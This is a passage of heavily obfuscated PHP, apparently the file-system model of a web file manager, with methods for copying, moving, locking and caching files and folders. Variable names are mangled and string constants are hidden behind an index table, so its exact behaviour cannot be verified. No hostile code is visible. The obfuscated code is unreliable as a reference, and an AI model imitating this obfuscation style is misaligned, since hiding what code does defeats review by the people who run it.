htmlspecialchars($îÅ¸’Ì[$£Ÿ±¯ÖÒ[32]]) . $£Ÿ±¯ÖÒ[164] . $…âõÁ’); $this->_lockKey($£…Ôıİç, 1); $this->_lockKey($£…Ôıİç, 0); $Ş—ëĞŠÀ = array_reverse($this->parentLevelArray($îÅ¸’Ì[$£Ÿ±¯ÖÒ[511]])); foreach ($Ş—ëĞŠÀ as $åÒ‚¨›Î) { $£…Ôıİç = $ŠÏ‰ä„Ñ . $£Ÿ±¯ÖÒ[555] . $åÒ‚¨›Î; if (CacheLock::lockGet($£Ÿ±¯ÖÒ[556] . $£…Ôıİç)) { $îÅ¸’Ì = $this->sourceInfo($åÒ‚¨›Î); CacheLock::setErrorMsg($£Ÿ±¯ÖÒ[162] . htmlspecialchars($îÅ¸’Ì[$£Ÿ±¯ÖÒ[32]]) . $£Ÿ±¯ÖÒ[164] . $…âõÁ’); $this->_lockKey($£…Ôıİç, 1); $this->_lockKey($£…Ôıİç, 0); } } } private function _lockCheckEnd($ªªäü£¼, $î“˜ß¹æ) { $şŠİÓİ =& $_SERVER[å¸¿•¶£]; $¾áàğ×† = $ªªäü£¼ . $şŠİÓİ[10] . $î“˜ß¹æ; CacheLock::setErrorMsg($şŠİÓİ[378]); if (!isset($this->_lockTimeStart[$¾áàğ×†])) { return; } $Ë¨”œÀ± = timeFloat() - $this->_lockTimeStart[$¾áàğ×†]; unset($this->_lockTimeStart[$¾áàğ×†]); if ($Ë¨”œÀ± > 0.5) { unset(self::$cacheSourceInfo[$şŠİÓİ[460] . $î“˜ß¹æ]); } $¡ÊÊèÊ± = $this->sourceInfo($î“˜ß¹æ); if (!$¡ÊÊèÊ±) { show_json(LNG($şŠİÓİ[105]), !1); } } private function _lockParent($¾’Ñ¶ÙÆ, $”Ù¡ñ«, $şĞíÒˆ) { if (!$this->autoLockSet) { return; } $–ÆÒ´¨š = $this->sourceInfo($¾’Ñ¶ÙÆ); if (!is_array($–ÆÒ´¨š)) { return; } $åİÛ¿ = array_reverse($this->parentLevelArray($–ÆÒ´¨š[$_SERVER[å¸¿•¶£][511]])); foreach ($åİÛ¿ as $½¤Ó”ûİ) { $this->_lockEvent($½¤Ó”ûİ, $”Ù¡ñ«, $şĞíÒˆ); } } private function _lockEvent($Ò®õŸô†, $ù«ÚüÇá, $š¹Ù¸ç§) { $Ò¿¸”•¨ =& $_SERVER[å¸¿•¶£]; if (!$this->autoLockSet) { return; } foreach ($ù«ÚüÇá as $ÑõÛÀ•Â) { $òûİıô = $ÑõÛÀ•Â . $Ò¿¸”•¨[10] . $Ò®õŸô†; if ($š¹Ù¸ç§ && CacheLock::lockGet($Ò¿¸”•¨[556] . $òûİıô)) { continue; } $this->_lockKey($òûİıô, $š¹Ù¸ç§); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($³ßÍ½‘â, $±ñ¸Ê¸Ø = 1) { $•Ç…‰İÏ = $_SERVER[å¸¿•¶£][556] . md5($³ßÍ½‘â); if ($±ñ¸Ê¸Ø) { if (isset(self::$_lockItemArr[$•Ç…‰İÏ])) { return; } self::$_lockItemArr[$•Ç…‰İÏ] = 1; CacheLock::lock($•Ç…‰İÏ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$•Ç…‰İÏ])) { return; } unset(self::$_lockItemArr[$•Ç…‰İÏ]); CacheLock::unlock($•Ç…‰İÏ); } } public function isParentOf($ĞİËéèª, $¼µÁ»Øõ) { $ÌûÕ½ıÂ =& $_SERVER[å¸¿•¶£]; $Êª ÓÜ = $this->sourceInfo($ĞİËéèª); $Œªé“Ğ = $this->sourceInfo($¼µÁ»Øõ); $ºØ‘Ó¥ˆ = $Êª ÓÜ[$ÌûÕ½ıÂ[511]] . $Êª ÓÜ[$ÌûÕ½ıÂ[402]] . $ÌûÕ½ıÂ[50]; $ı®¨©Óš = $Œªé“Ğ[$ÌûÕ½ıÂ[511]] . $Œªé“Ğ[$ÌûÕ½ıÂ[402]] . $ÌûÕ½ıÂ[50]; $†à€Üè = strpos($ı®¨©Óš, $ºØ‘Ó¥ˆ) === 0; return $†à€Üè; } private $targetIsDelete = 0; public function copy($‡¹•ïè‚, $“½í¶øè, $Ñ§•º¤Õ = REPEAT_REPLACE, $à¬Àáò× = '') { $ƒÌç”‰ =& $_SERVER[å¸¿•¶£]; $ÍŞş«Ö¥ = $this->sourceInfo($‡¹•ïè‚); $¬öƒ¤ºò = $this->sourceInfo($“½í¶øè); if (!$ÍŞş«Ö¥ || !$¬öƒ¤ºò || $¬öƒ¤ºò[$ƒÌç”‰[410]] != $ƒÌç”‰[88]) { return !1; } if ($this->isParentOf($‡¹•ïè‚, $“½í¶øè)) { return !1; } $Å–Ç­–õ = $à¬Àáò× ? $à¬Àáò× : $ÍŞş«Ö¥[$ƒÌç”‰[32]]; $this->lockCopyStart($‡¹•ïè‚); $this->lockWriteStart($“½í¶øè, $Å–Ç­–õ); $È°£İ©‡ = array($ƒÌç”‰[557] => array(), $ƒÌç”‰[558] => array(), $ƒÌç”‰[559] => array()); $this->targetIsDelete = intval($ÍŞş«Ö¥[$ƒÌç”‰[431]]); $Î«äÖÈ¿ = $this->fileNameExistCache($“½í¶øè, $ÍŞş«Ö¥[$ƒÌç”‰[32]]); $ˆÛ í‹… = $this->_copy($‡¹•ïè‚, $“½í¶øè, $Ñ§•º¤Õ, $È°£İ©‡, !0, $à¬Àáò×); $this->_childrenListClear(); $this->lockCopyEnd($‡¹•ïè‚); $this->lockWriteEnd($“½í¶øè, $Å–Ç­–õ); if ($ÍŞş«Ö¥[$ƒÌç”‰[410]] == $ƒÌç”‰[88] && $Î«äÖÈ¿ == $ˆÛ í‹…) { $this->folderSizeResetChildren($Î«äÖÈ¿); } Model($ƒÌç”‰[560])->addAll($È°£İ©‡[$ƒÌç”‰[558]], array(), !0); if ($Î«äÖÈ¿ != $ˆÛ í‹… || $ÍŞş«Ö¥[$ƒÌç”‰[410]] == $ƒÌç”‰[88]) { Model($ƒÌç”‰[561])->eventCopy($ˆÛ í‹…); } $this->saveAll($È°£İ©‡[$ƒÌç”‰[559]]); Model($ƒÌç”‰[200])->linkAdd($È°£İ©‡[$ƒÌç”‰[557]]); $this->folderSizeReset($“½í¶øè); $this->updateModifyTime($“½í¶øè); return $ˆÛ í‹…; } private function _copy($¯ÕŒ…ÁË, $¸‡üÃ, $À€Ù·¸ë, &$ˆÕ‰Ÿ¨, $éÏ“õÜ™, $‰ä²¨İ¡ = '') { $ÏÆıŒàØ =& $_SERVER[å¸¿•¶£]; $¾®À¸Ï = $this->sourceInfoCache($¯ÕŒ…ÁË); $Òİ×Ÿ× = $¾®À¸Ï[$ÏÆıŒàØ[410]] == $ÏÆıŒàØ[88]; $„‰Ïø·è = $‰ä²¨İ¡ ? $‰ä²¨İ¡ : $¾®À¸Ï[$ÏÆıŒàØ[32]]; $ùë¥æ²ª = $this->fileNameExistCache($¸‡üÃ, $„‰Ïø·è); if ($éÏ“õÜ™) { $this->_childrenAllMake($¯ÕŒ…ÁË); if ($Òİ×Ÿ× && $ùë¥æ²ª) { $this->_childrenAllMake($ùë¥æ²ª); } } if (!$ùë¥æ²ª) { return $this->_copyCreate($¯ÕŒ…ÁË, $¸‡üÃ, $„‰Ïø·è, $ˆÕ‰Ÿ¨); } $¦ŒüªÖ  = $ùë¥æ²ª; if ($Òİ×Ÿ×) { if ($À€Ù·¸ë == REPEAT_RENAME_FOLDER) { $„‰Ïø·è = $this->fileNameAutoCache($¸‡üÃ, $„‰Ïø·è, $À€Ù·¸ë, $Òİ×Ÿ×); $¦ŒüªÖ  = $this->_copyCreate($¯ÕŒ…ÁË, $¸‡üÃ, $„‰Ïø·è, $ˆÕ‰Ÿ¨); } else { $‡¢Ãø¶“ = $this->_childrenList($¯ÕŒ…ÁË); foreach ($‡¢Ãø¶“ as $œâ©Ğ–Ú) { $this->_copy($œâ©Ğ–Ú[$ÏÆıŒàØ[402]], $ùë¥æ²ª, $À€Ù·¸ë, $ˆÕ‰Ÿ¨, !1); } } } else { if ($À€Ù·¸ë == REPEAT_RENAME || $À€Ù·¸ë == REPEAT_RENAME_FOLDER) { $„‰Ïø·è = $this->fileNameAutoCache($¸‡üÃ, $„‰Ïø·è, $À€Ù·¸ë, $Òİ×Ÿ×); $¦ŒüªÖ  = $this->_copyCreate($¯ÕŒ…ÁË, $¸‡üÃ, $„‰Ïø·è, $ˆÕ‰Ÿ¨); } else { if ($À€Ù·¸ë == REPEAT_REPLACE) { $ßŸÕôü = $this->sourceInfoCache($ùë¥æ²ª); $àŸ¡ïÄÁ = $this->fileHistory($ßŸÕôü, $¾®À¸Ï[$ÏÆıŒàØ[468]], $¾®À¸Ï[$ÏÆıŒàØ[76]]); if ($àŸ¡ïÄÁ) { $ˆÕ‰Ÿ¨[$ÏÆıŒàØ[557]][] = $¾®À¸Ï[$ÏÆıŒàØ[468]]; } } else { if ($À€Ù·¸ë == REPEAT_SKIP) { } } } Hook::trigger($ÏÆıŒàØ[562], array($ÏÆıŒàØ[563], $¾®À¸Ï, 0)); } return $¦ŒüªÖ ; } private function _copyCreate($åàèÆğİ, $ŸĞÌ˜íî, $òÔ…¸ï«, &$§èé ¢) { $…’×ù« =& $_SERVER[å¸¿•¶£]; $Ğˆâ»ıè = $this->sourceInfoCache($åàèÆğİ); $İÈ„ò‘ = $this->sourceInfoCache($ŸĞÌ˜íî); $¾…èŸş = $this->_makeItemData($Ğˆâ»ıè, $İÈ„ò‘, $òÔ…¸ï«); Hook::trigger($…’×ù«[564], $¾…èŸş); Hook::trigger($…’×ù«[565], array($…’×ù«[566], $¾…èŸş, 0)); $¡¥¤ÔãÎ = $this->add($¾…èŸş); $‘ê¤±°‡ = array($…’×ù«[402] => $¡¥¤ÔãÎ, $…’×ù«[32] => $òÔ…¸ï«); $this->_copyApplyMeta($‘ê¤±°‡, $§èé ¢); if ($Ğˆâ»ıè[$…’×ù«[410]] != $…’×ù«[88]) { $§èé ¢[$…’×ù«[557]][] = $Ğˆâ»ıè[$…’×ù«[468]]; return $¡¥¤ÔãÎ; } $²º•¢Ø© = array(); $”«Í¿•ï = array(); $this->_childrenListAll($åàèÆğİ, $²º•¢Ø©); $€šÙ‰Ô„ = count($²º•¢Ø©); if ($€šÙ‰Ô„ == 0) { return $¡¥¤ÔãÎ; } $¹ı’î¸ø = $this->sourceInfo($¡¥¤ÔãÎ); foreach ($²º•¢Ø© as $´Â´ñ¦Ø) { $ô’§ËÄÛ = $this->_makeItemData($´Â´ñ¦Ø, $¹ı’î¸ø, $´Â´ñ¦Ø[$…’×ù«[32]]); $ô’§ËÄÛ[$…’×ù«[511]] = $´Â´ñ¦Ø[$…’×ù«[511]]; $”«Í¿•ï[] = $ô’§ËÄÛ; } $this->chunkEventSet($…’×ù«[567], array($…’×ù«[568], $¾…èŸş, $€šÙ‰Ô„)); $this->addAll($”«Í¿•ï, array(), !1); $¨ôÎ¢Å = $this->where(array($…’×ù«[432] => $¡¥¤ÔãÎ))->select(); $Ó¿ú§Û = $this->_childrenMakeRelation($²º•¢Ø©, $¨ôÎ¢Å); $Ó¿ú§Û[$åàèÆğİ] = $¡¥¤ÔãÎ; $ÂÍáı‘¼ = array(); $±±à•Ô¼ = array(); foreach ($¨ôÎ¢Å as $´Â´ñ¦Ø) { $·€€¼ŞÊ = $´Â´ñ¦Ø[$…’×ù«[402]]; $¤†œ½Ö› = $this->_childrenMatch($Ó¿ú§Û, $´Â´ñ¦Ø, $¹ı’î¸ø); $ÂÍáı‘¼[] = array($…’×ù«[402], $·€€¼ŞÊ, $…’×ù«[432], $¤†œ½Ö›[$…’×ù«[432]]); $±±à•Ô¼[] = array($…’×ù«[402], $·€€¼ŞÊ, $…’×ù«[511], $¤†œ½Ö›[$…’×ù«[511]]); $this->_copyApplyMeta($´Â´ñ¦Ø, $§èé ¢); if ($´Â´ñ¦Ø[$…’×ù«[410]] != $…’×ù«[88]) { $§èé ¢[$…’×ù«[557]][] = $´Â´ñ¦Ø[$…’×ù«[468]]; } } $this->chunkEventSet($…’×ù«[569], array($…’×ù«[570], $¾…èŸş, $€šÙ‰Ô„)); $this->saveAll($ÂÍáı‘¼); $this->chunkEventSet($…’×ù«[571], array($…’×ù«[572], $¾…èŸş, $€šÙ‰Ô„)); $this->saveAll($±±à•Ô¼); return $¡¥¤ÔãÎ; } private function _childrenMakeRelation($ãÔ‹ºĞÜ, $’Ü›ˆÍ) { $Úñó…å =& $_SERVER[å¸¿•¶£]; $Ò†¨ğ´ = array(); $®İä = array(); foreach ($ãÔ‹ºĞÜ as $õ„ÊùµÁ) { $ëü‰â = $õ„ÊùµÁ[$Úñó…å[32]] . $Úñó…å[8] . $õ„ÊùµÁ[$Úñó…å[511]]; $Ò†¨ğ´[$ëü‰â] = $õ„ÊùµÁ[$Úñó…å[402]]; } foreach ($’Ü›ˆÍ as $õ„ÊùµÁ) { $ëü‰â = $õ„ÊùµÁ[$Úñó…å[32]] . $Úñó…å[8] . $õ„ÊùµÁ[$Úñó…å[511]]; $ß£¾šş¿ = $Ò†¨ğ´[$ëü‰â]; $®İä[$ß£¾šş¿] = $õ„ÊùµÁ[$Úñó…å[402]]; } return $®İä; } private function _childrenMatch($ŠŠıûßù, $¡‡Àã, $ş¬Ì ¼ã) { $ó‹ı÷İ¡ =& $_SERVER[å¸¿•¶£]; $şÀ±ôËü = $ş¬Ì ¼ã[$ó‹ı÷İ¡[511]]; $ÄÁ‚§Â = $this->parentLevelArray($¡‡Àã[$ó‹ı÷İ¡[511]]); foreach ($ÄÁ‚§Â as $Àøò·•ş) { if (isset($ŠŠıûßù[$Àøò·•ş])) { $şÀ±ôËü .= $ŠŠıûßù[$Àøò·•ş] . $ó‹ı÷İ¡[573]; } } $şÀ±ôËü = rtrim($şÀ±ôËü, $ó‹ı÷İ¡[50]) . $ó‹ı÷İ¡[50]; $ıçˆÎå  = $this->parentLevelArray($şÀ±ôËü); $–è”¼ëÌ = $ıçˆÎå [count($ıçˆÎå ) - 1]; return array($ó‹ı÷İ¡[432] => $–è”¼ëÌ, $ó‹ı÷İ¡[511] => $şÀ±ôËü); } private function _makeItemData($ú³æ…Çº, $İ””úüò, $İ‚¹¿ÅÅ) { $ä´½Â€ =& $_SERVER[å¸¿•¶£]; $Ä‹òøÉÏ = array($ä´½Â€[574] => $ú³æ…Çº[$ä´½Â€[410]], $ä´½Â€[420] => $İ‚¹¿ÅÅ, $ä´½Â€[575] => $ú³æ…Çº[$ä´½Â€[412]] ? $ú³æ…Çº[$ä´½Â€[412]] : $ä´½Â€[12], $ä´½Â€[469] => $ú³æ…Çº[$ä´½Â€[468]] ? $ú³æ…Çº[$ä´½Â€[468]] : 0, $ä´½Â€[545] => $ú³æ…Çº[$ä´½Â€[76]] ? $ú³æ…Çº[$ä´½Â€[76]] : 0, $ä´½Â€[576] => intval($İ””úüò[$ä´½Â€[411]]), $ä´½Â€[577] => intval($İ””úüò[$ä´½Â€[496]]), $ä´½Â€[578] => intval(USER_ID), $ä´½Â€[579] => intval(USER_ID), $ä´½Â€[401] => intval($İ””úüò[$ä´½Â€[402]]), $ä´½Â€[580] => $İ””úüò[$ä´½Â€[511]] . $İ””úüò[$ä´½Â€[402]] . $ä´½Â€[50], $ä´½Â€[424] => $ú³æ…Çº[$ä´½Â€[85]] ? $ú³æ…Çº[$ä´½Â€[85]] : time(), $ä´½Â€[430] => 0, $ä´½Â€[581] => $ä´½Â€[12]); return $Ä‹òøÉÏ; } private function _copyApplyMeta($í¦ú×Ñ˜, &$¡©€˜šÔ) { $äŠÑ‚÷ò =& $_SERVER[å¸¿•¶£]; $İÚ„È€ó = $í¦ú×Ñ˜[$äŠÑ‚÷ò[402]]; $µé¯Îã’ = $í¦ú×Ñ˜[$äŠÑ‚÷ò[32]]; if (!isset($í¦ú×Ñ˜[$äŠÑ‚÷ò[582]]) || !$í¦ú×Ñ˜[$äŠÑ‚÷ò[582]] || $í¦ú×Ñ˜[$äŠÑ‚÷ò[582]] == $äŠÑ‚÷ò[198]) { $¡©€˜šÔ[$äŠÑ‚÷ò[559]][] = array($äŠÑ‚÷ò[402], $İÚ„È€ó, $äŠÑ‚÷ò[582], short_id($İÚ„È€ó)); } if (Input::check($µé¯Îã’, $äŠÑ‚÷ò[583])) { $¡©€˜šÔ[$äŠÑ‚÷ò[558]][] = array($äŠÑ‚÷ò[402] => $İÚ„È€ó, $äŠÑ‚÷ò[94] => $äŠÑ‚÷ò[465], $äŠÑ‚÷ò[374] => str_replace($äŠÑ‚÷ò[53], $äŠÑ‚÷ò[12], Pinyin::get($µé¯Îã’))); $¡©€˜šÔ[$äŠÑ‚÷ò[558]][] = array($äŠÑ‚÷ò[402] => $İÚ„È€ó, $äŠÑ‚÷ò[94] => $äŠÑ‚÷ò[464], $äŠÑ‚÷ò[374] => Pinyin::get($µé¯Îã’, $äŠÑ‚÷ò[584])); } $¡©€˜šÔ[$äŠÑ‚÷ò[558]][] = array($äŠÑ‚÷ò[402] => $İÚ„È€ó, $äŠÑ‚÷ò[94] => $äŠÑ‚÷ò[444], $äŠÑ‚÷ò[374] => KodSort::makeStr($µé¯Îã’)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($±ÓÊ°”Ÿ) { $ô”ãï« =& $_SERVER[å¸¿•¶£]; $€¡³Ü¿í = $this->sourceInfo($±ÓÊ°”Ÿ); $äÌı•ê‘ = $ô”ãï«[585]; $…°äõì = array($ô”ãï«[511] => array($ô”ãï«[540], $€¡³Ü¿í[$ô”ãï«[511]] . $±ÓÊ°”Ÿ . $ô”ãï«[541]), $ô”ãï«[431] => $this->targetIsDelete); $§ÛË‹—· = $this->field($äÌı•ê‘)->where($…°äõì)->select(); if (!$§ÛË‹—·) { return; } $§ÛË‹—· = array_to_keyvalue($§ÛË‹—·, $ô”ãï«[402]); foreach ($§ÛË‹—· as $²¹Óı) { $ÚÉ¢çâ² = $²¹Óı[$ô”ãï«[432]]; $±ÓÊ°”Ÿ = $²¹Óı[$ô”ãï«[402]]; if (!isset($this->_childrenListCache[$±ÓÊ°”Ÿ]) && $²¹Óı[$ô”ãï«[410]] == $ô”ãï«[88]) { $this->_childrenListCache[$±ÓÊ°”Ÿ] = array(); } if (!isset($this->_childrenListCache[$ÚÉ¢çâ²])) { $this->_childrenListCache[$ÚÉ¢çâ²] = array(); } $this->_childrenListCache[$ÚÉ¢çâ²][$±ÓÊ°”Ÿ] = $²¹Óı; $this->_childrenItemCache[$±ÓÊ°”Ÿ] = $²¹Óı; } } private function _childrenListAll($ã¼©œóî, &$ĞşÒœ„¯) { $¾­Ÿ¦úÒ =& $_SERVER[å¸¿•¶£]; if (!isset($this->_childrenListCache[$ã¼©œóî])) { return; } $‰®Ç–Ú½ = $this->_childrenListCache[$ã¼©œóî]; foreach ($‰®Ç–Ú½ as $ô¥‡İ => $ŞÎ´Óºì) { $ĞşÒœ„¯[$ô¥‡İ] = $ŞÎ´Óºì; if ($ŞÎ´Óºì[$¾­Ÿ¦úÒ[410]] == $¾­Ÿ¦úÒ[88]) { $this->_childrenListAll($ô¥‡İ, $ĞşÒœ„¯); } } } private function sourceInfoCache($×ÏöæÇ) { if (isset($this->_childrenItemCache[$×ÏöæÇ])) { return $this->_childrenItemCache[$×ÏöæÇ]; } return $this->sourceInfo($×ÏöæÇ); } private function _childrenList($ËÔÇçÜÛ) { if (isset($this->_childrenListCache[$ËÔÇçÜÛ])) { return $this->_childrenListCache[$ËÔÇçÜÛ]; } return $this->_childrenListSelect($ËÔÇçÜÛ); } private function _childrenListSelect($íòû¦Ö) { $¿ªƒö¡Ù =& $_SERVER[å¸¿•¶£]; $üË½éÑñ = array($¿ªƒö¡Ù[432] => $íòû¦Ö, $¿ªƒö¡Ù[431] => $this->targetIsDelete); $Ö¼œ²à· = $this->where($üË½éÑñ)->select(); $Ö¼œ²à· = $Ö¼œ²à· ? $Ö¼œ²à· : array(); $¦ß£Èíé = array_to_keyvalue($Ö¼œ²à·, $¿ªƒö¡Ù[402]); $this->_childrenListCache[$íòû¦Ö] = $¦ß£Èíé; foreach ($¦ß£Èíé as $íòû¦Ö => $óÈÜõö) { $this->_childrenItemCache[$íòû¦Ö] = $óÈÜõö; } return $¦ß£Èíé; } private function fileNameExistCache($ûËù©è’, $¿Ä¢Òõû) { $ıÏó¡èœ =& $_SERVER[å¸¿•¶£]; $¿Ä¢Òõû = strtolower($¿Ä¢Òõû); $ºììô¯¬ = $this->_childrenList($ûËù©è’); foreach ($ºììô¯¬ as $ĞÃùİÇî) { if ($¿Ä¢Òõû == strtolower($ĞÃùİÇî[$ıÏó¡èœ[32]])) { return $ĞÃùİÇî[$ıÏó¡èœ[402]]; } } return !1; } private function fileNameAutoCache($ÍÒ«Óƒœ, $ö¨„„Ş´, $ Æ¯úÛÀ, $‰ƒŠªÑÉ) { $ÈŸõÂà… =& $_SERVER[å¸¿•¶£]; $£éˆ™ù = $this->_childrenList($ÍÒ«Óƒœ); $†‡¥™ºª = array_to_keyvalue($£éˆ™ù, $ÈŸõÂà…[12], $ÈŸõÂà…[32]); return $this->fileNameAutoGet($†‡¥™ºª, $ö¨„„Ş´, $ Æ¯úÛÀ, $‰ƒŠªÑÉ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($—„¢â¶ƒ, $•õí‚ÉÇ, $ş¶Òûü = REPEAT_REPLACE, $ê¿ªà´­ = '') { $¶²©¸²÷ =& $_SERVER[å¸¿•¶£]; $Ğ‹ßÄ” = $this->sourceInfo($—„¢â¶ƒ); $Ìˆ†ÀÉÁ = $this->sourceInfo($•õí‚ÉÇ); if ($Ğ‹ßÄ”[$¶²©¸²÷[432]] == $Ìˆ†ÀÉÁ[$¶²©¸²÷[402]]) { if ($Ğ‹ßÄ”[$¶²©¸²÷[431]] == $¶²©¸²÷[88]) { Model($¶²©¸²÷[429])->restore(array($—„¢â¶ƒ)); } if (!$ê¿ªà´­ || $ê¿ªà´­ == $Ğ‹ßÄ”[$¶²©¸²÷[32]]) { return $—„¢â¶ƒ; } } $ËÀÁ±¼‚ = $this->pathInfoMore($—„¢â¶ƒ); if ($this->isParentOf($—„¢â¶ƒ, $•õí‚ÉÇ)) { return !1; } if (!$Ğ‹ßÄ” || !$Ìˆ†ÀÉÁ || $Ìˆ†ÀÉÁ[$¶²©¸²÷[410]] != $¶²©¸²÷[88]) { return !1; } Hook::trigger($¶²©¸²÷[586], $ËÀÁ±¼‚); $this->targetIsDelete = intval($Ğ‹ßÄ”[$¶²©¸²÷[431]]); if ($Ğ‹ßÄ”[$¶²©¸²÷[432]] == $•õí‚ÉÇ && $ê¿ªà´­ != $Ğ‹ßÄ”[$¶²©¸²÷[32]]) { $ÂÃ’°¤ = $this->fileNameExist($•õí‚ÉÇ, $ê¿ªà´­); if ($ÂÃ’°¤ && $Ğ‹ßÄ”[$¶²©¸²÷[410]] == $¶²©¸²÷[198]) { $Ì¯©ì‰ = $this->sourceInfo($ÂÃ’°¤); $å¼êÓĞÈ = $this->fileHistory($Ì¯©ì‰, $Ğ‹ßÄ”[$¶²©¸²÷[468]], $Ğ‹ßÄ”[$¶²©¸²÷[76]]); if (!$å¼êÓĞÈ) { Model($¶²©¸²÷[471])->remove($Ğ‹ßÄ”[$¶²©¸²÷[468]]); } $this->removeNow($—„¢â¶ƒ, !1); $this->folderSizeReset($•õí‚ÉÇ); Hook::trigger($¶²©¸²÷[587], $ËÀÁ±¼‚); return $ÂÃ’°¤; } } $®ÔÁŞ = $ê¿ªà´­ ? $ê¿ªà´­ : $Ğ‹ßÄ”[$¶²©¸²÷[32]]; $this->lockMoveStart($—„¢â¶ƒ); $this->lockWriteStart($•õí‚ÉÇ, $®ÔÁŞ); $Õøû Â = array($¶²©¸²÷[557] => array(), $¶²©¸²÷[588] => !1); $this->clearShare($—„¢â¶ƒ, $•õí‚ÉÇ); $ŞëÜ½İø = $this->fileNameExistCache($•õí‚ÉÇ, $Ğ‹ßÄ”[$¶²©¸²÷[32]]); $§ÃÖŒ = $this->_move($—„¢â¶ƒ, $•õí‚ÉÇ, $ş¶Òûü, $Õøû Â, $ê¿ªà´­); $this->sourceCacheClear(); if ($Ğ‹ßÄ”[$¶²©¸²÷[410]] == $¶²©¸²÷[88] && $ŞëÜ½İø) { $this->folderSizeResetChildren($§ÃÖŒ); } Model($¶²©¸²÷[200])->linkAdd($Õøû Â[$¶²©¸²÷[557]]); if ($ŞëÜ½İø && $Õøû Â[$¶²©¸²÷[588]]) { $this->removeNow($—„¢â¶ƒ, !1); } $this->lockMoveEnd($—„¢â¶ƒ); $this->lockWriteEnd($•õí‚ÉÇ, $®ÔÁŞ); $this->folderSizeReset($Ğ‹ßÄ”[$¶²©¸²÷[432]]); $this->folderSizeReset($•õí‚ÉÇ); $•üéĞˆ = array($Ğ‹ßÄ”[$¶²©¸²÷[432]], $•õí‚ÉÇ); if ($Ğ‹ßÄ”[$¶²©¸²÷[410]] == $¶²©¸²÷[88]) { $•üéĞˆ[] = $—„¢â¶ƒ; } $this->updateModifyTime($•üéĞˆ); Model($¶²©¸²÷[561])->eventMove($—„¢â¶ƒ, $Ğ‹ßÄ”[$¶²©¸²÷[432]], $•õí‚ÉÇ); Hook::trigger($¶²©¸²÷[587], $ËÀÁ±¼‚); return $§ÃÖŒ; } private function _move($•âô¦à¯, $ŒÖĞÃ¦Ø, $—ô®é™µ, &$ùİàÚå, $ÒÇã‹µı = '') { $íâ“´‘± =& $_SERVER[å¸¿•¶£]; $ƒ¯˜¦åÑ = $this->sourceInfo($•âô¦à¯); $ü—¶ §á = $ƒ¯˜¦åÑ[$íâ“´‘±[410]] == $íâ“´‘±[88]; $Á‰ëÚá = $ÒÇã‹µı ? $ÒÇã‹µı : $ƒ¯˜¦åÑ[$íâ“´‘±[32]]; $³øÒ‹œ° = $this->fileNameExistCache($ŒÖĞÃ¦Ø, $Á‰ëÚá); $this->lockMoveStart($•âô¦à¯); $this->lockWriteStart($ŒÖĞÃ¦Ø, $Á‰ëÚá); if (!$³øÒ‹œ°) { return $this->_moveForce($•âô¦à¯, $ŒÖĞÃ¦Ø, $Á‰ëÚá); } $Ğ£›¼Ï¼ = $³øÒ‹œ°; $Áêí­ä½ = !1; if ($ü—¶ §á) { if ($—ô®é™µ == REPEAT_RENAME_FOLDER) { $Á‰ëÚá = $this->fileNameAuto($ŒÖĞÃ¦Ø, $Á‰ëÚá, $—ô®é™µ, $ü—¶ §á); $Ğ£›¼Ï¼ = $this->_moveForce($•âô¦à¯, $ŒÖĞÃ¦Ø, $Á‰ëÚá); } else { if ($—ô®é™µ == REPEAT_RENAME_FOLDER) { $—ô®é™µ = REPEAT_RENAME; } $®œéÁİ³ = $this->_childrenListSelect($•âô¦à¯); foreach ($®œéÁİ³ as $ìîÍ ²ğ) { $this->_move($ìîÍ ²ğ[$íâ“´‘±[402]], $³øÒ‹œ°, $—ô®é™µ, $ùİàÚå); } $Áêí­ä½ = !0; } } else { if ($—ô®é™µ == REPEAT_SKIP) { $Áêí­ä½ = !0; } else { if ($—ô®é™µ == REPEAT_RENAME || $—ô®é™µ == REPEAT_RENAME_FOLDER) { $Á‰ëÚá = $this->fileNameAuto($ŒÖĞÃ¦Ø, $Á‰ëÚá, $—ô®é™µ, $ü—¶ §á); $Ğ£›¼Ï¼ = $this->_moveForce($•âô¦à¯, $ŒÖĞÃ¦Ø, $Á‰ëÚá); } else { if ($—ô®é™µ == REPEAT_REPLACE) { $åŠ€®¯Ë = $this->sourceInfoCache($³øÒ‹œ°); $³ºÔ™Ş² = $this->fileHistory($åŠ€®¯Ë, $ƒ¯˜¦åÑ[$íâ“´‘±[468]], $ƒ¯˜¦åÑ[$íâ“´‘±[76]]); $Áêí­ä½ = !0; if ($³ºÔ™Ş²) { $ùİàÚå[$íâ“´‘±[557]][] = $ƒ¯˜¦åÑ[$íâ“´‘±[468]]; } } } } } if ($Áêí­ä½ && !$ùİàÚå[$íâ“´‘±[588]]) { $ùİàÚå[$íâ“´‘±[588]] = !0; } return $Ğ£›¼Ï¼; } private function _moveForce($´Ò¹Ü×­, $ã¦°ãéÑ, $¨Óï®š­) { $šˆâôã… =& $_SERVER[å¸¿•¶£]; $‰™íÖÅº = $this->sourceInfo($´Ò¹Ü×­); $ÜÊšËí = $this->sourceInfo($ã¦°ãéÑ); $ĞÓòì¡ = $‰™íÖÅº[$šˆâôã…[410]] == $šˆâôã…[88]; $É¾€ = array($šˆâôã…[401] => $ÜÊšËí[$šˆâôã…[402]], $šˆâôã…[580] => $ÜÊšËí[$šˆâôã…[511]] . $ÜÊšËí[$šˆâôã…[402]] . $šˆâôã…[50], $šˆâôã…[576] => $ÜÊšËí[$šˆâôã…[411]], $šˆâôã…[577] => $ÜÊšËí[$šˆâôã…[496]], $šˆâôã…[579] => USER_ID, $šˆâôã…[420] => $¨Óï®š­); $ıú‚¶’Ÿ = $‰™íÖÅº[$šˆâôã…[411]] == SourceModel::TYPE_GROUP && $ÜÊšËí[$šˆâôã…[411]] == SourceModel::TYPE_GROUP && $‰™íÖÅº[$šˆâôã…[496]] == $ÜÊšËí[$šˆâôã…[496]]; if (!$ıú‚¶’Ÿ && $this->moveClearAuth) { Model($šˆâôã…[493])->authClear($´Ò¹Ü×­); } $Öçõè¿² = $‰™íÖÅº[$šˆâôã…[431]] == $šˆâôã…[88] && $ÜÊšËí[$šˆâôã…[431]] != $šˆâôã…[88]; if ($Öçõè¿²) { $É¾€[$šˆâôã…[430]] = 0; } if ($ĞÓòì¡) { $¤âˆˆõ = array($šˆâôã…[580] => array($šˆâôã…[540], 